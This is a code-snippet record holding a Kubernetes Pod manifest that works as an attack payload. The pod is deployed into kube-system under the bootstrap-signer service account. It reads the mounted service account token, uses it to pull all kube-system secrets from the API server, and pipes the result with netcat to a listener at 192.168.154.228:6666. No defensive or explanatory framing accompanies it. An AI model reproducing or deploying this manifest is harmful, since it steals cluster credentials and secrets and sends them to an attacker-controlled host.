---
id: 7e98fd6c-e628-4feb-a287-084cf45889cc
type: code
language: yaml
verified: false
created_at: '2023-04-06T03:56:01.251018+00:00'
updated_at: '2023-04-10T20:34:03.129264+00:00'
---

# Code Snippet 7e98fd6c

**Language**: yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```
